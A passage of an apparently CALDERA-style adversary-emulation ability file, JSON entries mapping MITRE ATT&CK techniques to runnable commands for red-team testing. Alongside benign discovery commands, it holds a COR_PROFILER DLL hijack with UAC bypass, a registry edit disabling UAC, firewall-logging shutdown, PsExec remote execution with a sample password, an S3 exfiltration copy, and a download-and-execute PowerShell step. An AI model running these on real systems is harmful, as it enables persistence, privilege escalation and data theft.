                "additional_info": {},
                "variations": [],
                "command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Process discovery via SysInternals pstool",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "SysInternals PSTool Process Discovery",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "562d85a09d73f7471bd3232cbd8777cb",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "technique_id": "T1033",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "cmd.exe /C whoami && wmic useraccount get /ALL && quser /SERVER:\"#{computer_name}\" && quser && qwinsta.exe /server:#{computer_name} && qwinsta.exe && for /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt && @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "System Owner/User Discovery",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "4370001012f5f0df001269627b4737e9",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "technique_id": "T1033",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "users; w; who",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "users; w; who",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "System Owner/User Discovery (2)",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "ad22a8ff48aa34cb1b3feb93d8326c33",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Hijack Execution Flow: COR_PROFILER",
        "technique_id": "T1574.012",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value 83f016_T1574.012x64.dll -Force | Out-Null",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "83f016_T1574.012x64.dll"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "System Scope COR_PROFILER",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "d6bb2a19da7246731ed9c44831b135f8",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Service Discovery",
        "technique_id": "T1007",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tasklist.exe && sc query && sc query state= all",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "System Service Discovery",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "9d03c91bdae5a80f17f89c987942b5a8",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Service Discovery",
        "technique_id": "T1007",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "del /f /q /s C:\\Windows\\Temp\\service-list.txt >nul 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net.exe start >> C:\\Windows\\Temp\\service-list.txt",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in c:\\Windows\\Temp\\service-list.txt.s\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "System Service Discovery - net.exe",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "4f4b640f1cc25b1ecc03690327517411",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Service Discovery",
        "technique_id": "T1007",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "systemctl --type=service",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Enumerates system service using systemctl\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "System Service Discovery - systemctl",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "5a39d7ed-45c9-4a79-b581-e5fb99e24f65",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-Process",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tasklist",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": "ProcessDump.donut",
                "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabAllProcesses()\n        {\n            Process[] allProc = Process.GetProcesses();\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabAllProcesses();\n        }\n    }\n}",
                "platform": "windows",
                "language": "csharp",
                "additional_info": {},
                "variations": [],
                "command": null,
                "name": "donut_amd64",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ps aux",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ps aux",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Identify system processes",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "System processes",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "57c937f19b6539e983cb807ad74e9cd8",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tail /var/log/ufw.log",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file \n/var/log/ufw.log.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Tail the UFW firewall log file",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "ba0deadb-97ac-4a4c-aa81-21912fc90980",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Transfer Data to Cloud Account",
        "technique_id": "T1537",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Transfer the compressed archive from one S3 bucket to another S3 bucket via AWS CLI. It is assumed that the proper\npolicies and security rules are in place to allow reading from the source bucket and writing to the destination\nbucket.\n",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Transfer Compressed Archive to Separate S3 Bucket via AWS CLI",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.compress"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "c01780a26cb87c321879cb4b8527ee6f",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "technique_id": "T1562.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "ufw logging low; ufw status verbose"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ufw logging off",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Turn off the Uncomplicated Firewall (UFW) logging. \n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Turn off UFW logging",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "7c42a30c-c8c7-44c5-80a8-862d364ac1e4",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "technique_id": "T1518.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo $(get-uac)",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo $(get-uac)",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Determine whether or not UAC is enabled",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "UAC Status",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "665432a4-42e7-4ee1-af19-a9a8c9455d0c",
        "buckets": [
            "privilege-escalation"
        ],
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
        "technique_id": "T1548.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Set a registry key to allow UAC bypass",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "UAC bypass registry",
        "tactic": "privilege-escalation",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "9b007f62-daa1-44bd-a57d-00c5315ec6fe",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Peripheral Device Discovery",
        "technique_id": "T1120",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "system_profiler SPUSBDataType",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "find attached usb devices",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "USB Connected Device Discovery",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "491a6258d8063dd476af143d2cc3b055",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "System Services: Service Execution",
        "technique_id": "T1569.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "C:\\PSTools\\PsExec.exe \\\\localhost -u DOMAIN\\Administrator -p P@ssw0rd1 -accepteula \"C:\\Windows\\System32\\calc.exe\"",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill start a process on a remote host.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Use PsExec to execute a command on a remote host",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "2bf75f949823305d3ea815c8e94e9ee3",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "technique_id": "T1033",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item -Path .\\CurrentactiveUser.txt -Force"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt ; $env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Use the PowerShell environment variables to identify the current logged user.",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "User Discovery With Env Vars PowerShell Script",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "16b7ce2e6bb3e3590fa3e0d6d2d8c6d8",
        "buckets": [
            "multiple"
        ],
        "privilege": "",
        "technique_name": "Hijack Execution Flow: COR_PROFILER",
        "technique_id": "T1574.012",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Recurse -Force -ErrorAction Ignore ; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -ForegroundColor Cyan; New-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32\" -Value 83f016_T1574.012x64.dll -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value 83f016_T1574.012x64.dll -Force | Out-Null; Write-Host \"executing eventvwr.msc\" -ForegroundColor Cyan; START MMC.EXE EVENTVWR.MSC",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "83f016_T1574.012x64.dll"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).\nThe unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.\nAdditionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.\nIf the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,\nthe notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "User scope COR_PROFILER",
        "tactic": "multiple",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "335cea7b-bec0-48c6-adfb-6066070f5f68",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Process Discovery",
        "technique_id": "T1057",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ps",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "ps",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "get-process",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Display information about current system processes",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "View Processes",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "530e47c6-8592-42bf-91df-c59ffbd8541b",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Network Share Discovery",
        "technique_id": "T1135",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-SmbShare | ConvertTo-Json",
                "name": "pwsh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.json",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "domain.smb.share",
                                "custom_parser_vals": {
                                    "json_key": "Path",
                                    "json_type": "str"
                                }
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-SmbShare | ConvertTo-Json",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.json",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "domain.smb.share",
                                "custom_parser_vals": {
                                    "json_key": "Path",
                                    "json_type": "str"
                                }
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Network Share Discovery",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "View admin shares",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "6c91884e-11ec-422f-a6ed-e76774b0daac",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Peripheral Device Discovery",
        "technique_id": "T1120",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "lpq -a",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.printer_queue",
                        "parserconfigs": [
                            {
                                "edge": "has_size",
                                "target": "host.print.size",
                                "source": "host.print.file",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "lpq -a",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.printer_queue",
                        "parserconfigs": [
                            {
                                "edge": "has_size",
                                "target": "host.print.size",
                                "source": "host.print.file",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "View details of queued documents in printer queue",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "View printer queue",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "deeac480-5c2a-42b5-90bb-41675ee53c7e",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Network Share Discovery",
        "technique_id": "T1135",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net view \\\\#{remote.host.fqdn} /all",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.net_view",
                        "parserconfigs": [
                            {
                                "edge": "has_share",
                                "target": "remote.host.share",
                                "source": "remote.host.fqdn",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net view \\\\#{remote.host.fqdn} /all",
                "name": "cmd",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.net_view",
                        "parserconfigs": [
                            {
                                "edge": "has_share",
                                "target": "remote.host.share",
                                "source": "remote.host.fqdn",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "View the shares of a remote host",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "View remote shares",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "5dc841fd-28ad-40e2-b10e-fb007fe09e81",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Virtualization/Sandbox Evasion: System Checks",
        "technique_id": "T1497.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "get-wmiobject win32_computersystem | fl model",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Determine if the system is virtualized or physical",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Virtual or Real",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "94f21386-9547-43c4-99df-938ab05d45ce",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "WMIC",
        "technique_id": "T1047",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Capture process id, executable path, pid and parent pid before writing to disk",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "WMIC Process Enumeration",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "10681f2f-be03-44af-858d-f2b0812df185",
        "buckets": [
            "privilege-escalation"
        ],
        "privilege": "",
        "technique_name": "Hijack Execution Flow: Services File Permissions Weakness",
        "technique_id": "T1574.010",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
